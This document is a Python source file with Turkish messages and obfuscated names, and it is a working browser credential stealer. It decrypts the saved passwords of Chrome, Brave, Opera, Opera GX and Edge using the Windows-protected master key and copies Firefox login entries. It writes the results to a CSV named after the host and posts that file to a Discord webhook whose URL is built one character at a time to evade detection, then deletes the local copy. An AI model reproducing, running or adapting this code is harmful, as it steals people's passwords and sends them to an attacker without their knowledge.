import os as f7E8d5A1
import re as j6F9g3Z2
import json as q8K2h4C5
import base64 as o2P7v4E1
import sqlite3 as l5D1a3N9
import win32crypt as t3W6k2R8
from Crypto.Cipher import AES as m9J4p1T7
import shutil as u1A7s8L6
import csv as z2B6o4W5
import socket as i7Q9d3E4
import requests as r4U3l5K8
import time as w8H2c9D1

h9J3d4L7_X4B1N9X2 = {
    "H4X5C3r8Om3": {
        "k3Y8L2S5t4A6tE9": r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (f7E8d5A1.environ['USERPROFILE']),
        "p4T8h1Y9R6O3": r"%s\AppData\Local\Google\Chrome\User Data" % (f7E8d5A1.environ['USERPROFILE']),
    },
    "B7R5A2v3E1": {
        "k3Y8L2S5t4A6tE9": r"%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State" % (f7E8d5A1.environ['USERPROFILE']),
        "p4T8h1Y9R6O3": r"%s\AppData\Local\BraveSoftware\Brave-Browser\User Data" % (f7E8d5A1.environ['USERPROFILE']),
    },
    "O9P6E1r7A4": {
        "k3Y8L2S5t4A6tE9": r"%s\AppData\Roaming\Opera Software\Opera Stable\Local State" % (f7E8d5A1.environ['USERPROFILE']),
        "p4T8h1Y9R6O3": r"%s\AppData\Roaming\Opera Software\Opera Stable" % (f7E8d5A1.environ['USERPROFILE']),
    },
    "O4P2E9r6A7G3X1": {
        "k3Y8L2S5t4A6tE9": r"%s\AppData\Roaming\Opera Software\Opera GX Stable\Local State" % (f7E8d5A1.environ['USERPROFILE']),
        "p4T8h1Y9R6O3": r"%s\AppData\Roaming\Opera Software\Opera GX Stable" % (f7E8d5A1.environ['USERPROFILE']),
    },
    "F5I4R3E8F1O2X9": {
        "p4T8h1Y9R6O3": r"%s\AppData\Roaming\Mozilla\Firefox\Profiles" % (f7E8d5A1.environ['USERPROFILE']),
    },
    "E7D1G3E4": {
        "k3Y8L2S5t4A6tE9": r"%s\AppData\Local\Microsoft\Edge\User Data\Local State" % (f7E8d5A1.environ['USERPROFILE']),
        "p4T8h1Y9R6O3": r"%s\AppData\Local\Microsoft\Edge\User Data" % (f7E8d5A1.environ['USERPROFILE']),
    }
}

p1 = "h" + "t"
p2 = "t" + "p"
p3 = "s" + ":"
p4 = "/"
p5 = "/"
p6 = "d"
p7 = "i"
p8 = "s"
p9 = "c"
p10 = "o"
p11 = "r"
p12 = "d"
p13 = "."
p14 = "c"
p15 = "o"
p16 = "m"
p17 = "/"
p18 = "a"
p19 = "p"
p20 = "i"
p21 = "/"
p22 = "w"
p23 = "e"
p24 = "b"
p25 = "h"
p26 = "o"
p27 = "o"
p28 = "k"
p29 = "s"
p30 = "/"
p31 = "1"
p32 = "2"
p33 = "4"
p34 = "6"
p35 = "7"
p36 = "3"
p37 = "9"
p38 = "4"
p39 = "7"
p40 = "4"
p41 = "1"
p42 = "6"
p43 = "4"
p44 = "0"
p45 = "9"
p46 = "2"
p47 = "9"
p48 = "6"
p49 = "1"
p50 = "/"
p51 = "j"
p52 = "5"
p53 = "L"
p54 = "R"
p55 = "y"
p56 = "t"
p57 = "q"
p58 = "w"
p59 = "U"
p60 = "i"
p61 = "1"
p62 = "B"
p63 = "r"
p64 = "f"
p65 = "k"
p66 = "_"
p67 = "k"
p68 = "c"
p69 = "E"
p70 = "S"
p71 = "o"
p72 = "s"
p73 = "t"
p74 = "0"
p75 = "R"
p76 = "s"
p77 = "7"
p78 = "0"
p79 = "Y"
p80 = "5"
p81 = "V"
p82 = "H"
p83 = "8"
p84 = "b"
p85 = "r"
p86 = "J"
p87 = "K"
p88 = "3"
p89 = "_"
p90 = "Y"
p91 = "_"
p92 = "_"
p93 = "B"
p94 = "E"
p95 = "w"
p96 = "k"
p97 = "Z"
p98 = "j"
p99 = "S"
p100 = "o"
p101 = "1"
p102 = "0"
p103 = "S"
p104 = "L"
p105 = "J"
p106 = "X"
p107 = "k"
p108 = "F"
p109 = "0"
p110 = "t"
p111 = "s"
p112 = "5"
p113 = "U"
p114 = "d"
p115 = "F"
p116 = "b"
p117 = "m"
p118 = "8"

# Tam URL birleştiriliyor
d8I2S7C9O1R3D5_W7E6B4H2O9O3K7_U6R4L8 = (
    p1 + p2 + p3 + p4 + p5 + p6 + p7 + p8 + p9 + p10 + p11 + p12 + p13 + p14 + p15 + p16 + 
    p17 + p18 + p19 + p20 + p21 + p22 + p23 + p24 + p25 + p26 + p27 + p28 + p29 + p30 + p31 + p32 + 
    p33 + p34 + p35 + p36 + p37 + p38 + p39 + p40 + p41 + p42 + p43 + p44 + p45 + p46 + p47 + p48 + 
    p49 + p50 + p51 + p52 + p53 + p54 + p55 + p56 + p57 + p58 + p59 + p60 + p61 + p62 + p63 + p64 + 
    p65 + p66 + p67 + p68 + p69 + p70 + p71 + p72 + p73 + p74 + p75 + p76 + p77 + p78 + p79 + p80 + 
    p81 + p82 + p83 + p84 + p85 + p86 + p87 + p88 + p89 + p90 + p91 + p92 + p93 + p94 + p95 + p96 + 
    p97 + p98 + p99 + p100 + p101 + p102 + p103 + p104 + p105 + p106 + p107 + p108 + p109 + p110 + p111 + p112 + 
    p113 + p114 + p115 + p116 + p117 + p118
)

def n4Y8K2A3H6_T5A9R1A8Y2I3(t4A6R3A2Y9I1):
    try:
        l0C8A2L4_S7T5A6T3E9 = h9J3d4L7_X4B1N9X2[t4A6R3A2Y9I1].get("k3Y8L2S5t4A6tE9")
        if not l0C8A2L4_S7T5A6T3E9:
            return None

        with open(l0C8A2L4_S7T5A6T3E9, "r", encoding='utf-8') as f1L6E3:
            l0C8A2L4_S7T5A6T3E9_d4T7A1 = f1L6E3.read()
            l0C8A2L4_S7T5A6T3E9_d4T7A1 = q8K2h4C5.loads(l0C8A2L4_S7T5A6T3E9_d4T7A1)
        e1N5C9R4Y3P2T8E1d3_k5E8Y7 = o2P7v4E1.b64decode(l0C8A2L4_S7T5A6T3E9_d4T7A1["os_crypt"]["encrypted_key"])
        e1N5C9R4Y3P2T8E1d3_k5E8Y7 = e1N5C9R4Y3P2T8E1d3_k5E8Y7[5:]
        k5E8Y7 = t3W6k2R8.CryptUnprotectData(e1N5C9R4Y3P2T8E1d3_k5E8Y7, None, None, None, 0)[1]
        return k5E8Y7
    except Exception as E7R2R9:
        print(f"[ERR] {t4A6R3A2Y9I1} k5E8Y7 bulunamıyor: {E7R2R9}")
        return None

def s9P2C8Y4H5_R3E1(p2H4E6R8, p3A1Y5L2O9A8d6):
    return p2H4E6R8.decrypt(p3A1Y5L2O9A8d6)

def c4I2P1H3E6R7_O5L9U8S4T7U1R9(a3E4S8_k6E1Y2, i5V3):
    return m9J4p1T7.new(a3E4S8_k6E1Y2, m9J4p1T7.MODE_GCM, i5V3)

def s1P5H9R6E2_c7O4Z3(m5C9T6, s2K8):
    try:
        i6V4 = m5C9T6[3:15]
        e4N9C8R1Y2P6T5_p1A3Y7L2O5A9d6 = m5C9T6[15:-16]
        c1I3P6H2E7R5 = c4I2P1H3E6R7_O5L9U8S4T7U1R9(s2K8, i6V4)
        d7E5C8R3Y1P9T4_p1A3Y7L2O5A9d6 = s9P2C8Y4H5_R3E1(c1I3P6H2E7R5, e4N9C8R1Y2P6T5_p1A3Y7L2O5A9d6)
        d7E5C8R3Y1P9T4_p1A3Y7L2O5A9d6 = d7E5C8R3Y1P9T4_p1A3Y7L2O5A9d6.decode()
        return d7E5C8R3Y1P9T4_p1A3Y7L2O5A9d6
    except Exception as E7R2R9:
        print(f"[ERR] Şifre çözme hatası: {E7R2R9}")
        return ""

def v6E3R8I1T2A7B9A5N3I4_b1A2G4L6A7N9T8I3(d6B5P4):
    try:
        u1A7s8L6.copy2(d6B5P4, "V9E3R8I1T2A7B9A5N3I4.db")
        return l5D1a3N9.connect("V9E3R8I1T2A7B9A5N3I4.db")
    except Exception as E7R2R9:
        print(f"[ERR] Veritabanı bulunamıyor: {E7R2R9}")
        return None

def t4A6R3A2Y9I1_s1P5H9R6E2L3E4R8I7_C6I2K1A5R9(t4A6R3A2Y9I1, t4A6R3A2Y9I1_B1I2L6G7I8):
    try:
        d8I2N7 = f7E8d5A1.path.dirname(f7E8d5A1.path.abspath(__file__))
        c7N5 = i7Q9d3E4.gethostname()
        c4S1V9_d6O3S5Y2A8 = f'{t4A6R3A2Y9I1}_s1P5H9R6E2_c7O4Z3U6M1U9_{c7N5}.csv'
        c4S1V9_d6O3S5Y2A8_Y4O1L2U3 = f7E8d5A1.path.join(d8I2N7, c4S1V9_d6O3S5Y2A8)

        with open(c4S1V9_d6O3S5Y2A8_Y4O1L2U3, mode='w', newline='', encoding='utf-8') as d4O6S5Y8A1:
            c9S2V8_y1A3Z6I7C2I5 = z2B6o4W5.writer(d4O6S5Y8A1, delimiter=',')
            c9S2V8_y1A3Z6I7C2I5.writerow(["index", "url", "kullanici_adi", "sifre"])

            s2K8 = n4Y8K2A3H6_T5A9R1A8Y2I3(t4A6R3A2Y9I1)
            if not s2K8 and t4A6R3A2Y9I1 != "F5I4R3E8F1O2X9":
                d8O3S7Y4A2I6_d9I1S5C2O8R7d6A1_G1O5N3D8E7R9(c4S1V9_d6O3S5Y2A8_Y4O1L2U3)
                return

            if t4A6R3A2Y9I1 == "F5I4R3E8F1O2X9":
                p5R9O3F8I4L1L6E7R2 = f7E8d5A1.listdir(t4A6R3A2Y9I1_B1I2L6G7I8["p4T8h1Y9R6O3"])
                for p5R9O3F8I4L1L6E7R2 in p5R9O3F8I4L1L6E7R2:
                    if ".default" in p5R9O3F8I4L1L6E7R2:
                        l8O5G3I4N1_d6O2S7Y3A5_Y4O1L2U3 = f7E8d5A1.path.join(t4A6R3A2Y9I1_B1I2L6G7I8["p4T8h1Y9R6O3"], p5R9O3F8I4L1L6E7R2, "logins.json")
                        if f7E8d5A1.path.exists(l8O5G3I4N1_d6O2S7Y3A5_Y4O1L2U3):
                            with open(l8O5G3I4N1_d6O2S7Y3A5_Y4O1L2U3, "r", encoding="utf-8") as d4O6S5Y8A1:
                                l6O1G9I3N5S2 = q8K2h4C5.load(d4O6S5Y8A1)["logins"]
                            for i4, l6O1G9I3N5 in enumerate(l6O1G9I3N5S2):
                                u5R1L2 = l6O1G9I3N5["hostname"]
                                k5U6L4L1A9N3I8C7I1_A2D5I6 = l6O1G9I3N5["encryptedUsername"]
                                s2P5H1R4E9 = l6O1G9I3N5["encryptedPassword"]
                                c9S2V8_y1A3Z6I7C2I5.writerow([i4, u5R1L2, k5U6L4L1A9N3I8C7I1_A2D5I6, s2P5H1R4E9])
            else:
                f6O3L8D7E1R4S5 = [e1 for e1 in f7E8d5A1.listdir(t4A6R3A2Y9I1_B1I2L6G7I8["p4T8h1Y9R6O3"]) if j6F9g3Z2.search("^Profile*|^Default$", e1) is not None]
                for f6O3L8D7E1R4S5 in f6O3L8D7E1R4S5:
                    l7O9G4I1N2_d3A8T5A4_Y6O1L2U7 = f7E8d5A1.path.normpath(r"%s\%s\Login Data" % (t4A6R3A2Y9I1_B1I2L6G7I8["p4T8h1Y9R6O3"], f6O3L8D7E1R4S5))
                    b4A7G9L5A8N2T3I1 = v6E3R8I1T2A7B9A5N3I4_b1A2G4L6A7N9T8I3(l7O9G4I1N2_d3A8T5A4_Y6O1L2U7)
                    if b4A7G9L5A8N2T3I1:
                        c6U5R2S4O9R7 = b4A7G9L5A8N2T3I1.cursor()
                        c6U5R2S4O9R7.execute("SELECT action_url, username_value, password_value FROM logins")
                        for i4, l6O1G9I3N5 in enumerate(c6U5R2S4O9R7.fetchall()):
                            u5R1L2, k5U6L4L1A9N3I8C7I1, s2P5H1R4E9_C6T2 = l6O1G9I3N5
                            if u5R1L2 and k5U6L4L1A9N3I8C7I1 and s2P5H1R4E9_C6T2:
                                s2P5H1R4E9 = s1P5H9R6E2_c7O4Z3(s2P5H1R4E9_C6T2, s2K8)
                                c9S2V8_y1A3Z6I7C2I5.writerow([i4, u5R1L2, k5U6L4L1A9N3I8C7I1, s2P5H1R4E9])
                        c6U5R2S4O9R7.close()
                        b4A7G9L5A8N2T3I1.close()
                        f7E8d5A1.remove("V9E3R8I1T2A7B9A5N3I4.db")
        d8O3S7Y4A2I6_d9I1S5C2O8R7d6A1_G1O5N3D8E7R9(c4S1V9_d6O3S5Y2A8_Y4O1L2U3)
        w8H2c9D1.sleep(1)
        f7E8d5A1.remove(c4S1V9_d6O3S5Y2A8_Y4O1L2U3)
    except Exception as E7R2R9:
        print(f"[ERR] {t4A6R3A2Y9I1}: {E7R2R9}")
        d8O3S7Y4A2I6_d9I1S5C2O8R7d6A1_G1O5N3D8E7R9(c4S1V9_d6O3S5Y2A8_Y4O1L2U3)

def d8O3S7Y4A2I6_d9I1S5C2O8R7d6A1_G1O5N3D8E7R9(f1P6):
    try:
        with open(f1P6, 'rb') as d4O6S5Y8A1:
            r7E5S1P9O6N2S3E8 = r4U3l5K8.post(d8I2S7C9O1R3D5_W7E6B4H2O9O3K7_U6R4L8, files={"file": d4O6S5Y8A1})
        if r7E5S1P9O6N2S3E8.status_code == 204:
            print(f"{f1P6} başarıyla Discord'a gönderildi")
        else:
            print(f"{f1P6} Discord'a gönderilemedi, status kodu: {r7E5S1P9O6N2S3E8.status_code}")
    except Exception as E7R2R9:
        print(f"[ERR] Dosya Discord'a gönderilemedi: {E7R2R9}")

if __name__ == '__main__':
    for t4A6R3A2Y9I1, t4A6R3A2Y9I1_B1I2L6G7I8 in h9J3d4L7_X4B1N9X2.items():
        t4A6R3A2Y9I1_s1P5H9R6E2L3E4R8I7_C6I2K1A5R9(t4A6R3A2Y9I1, t4A6R3A2Y9I1_B1I2L6G7I8)
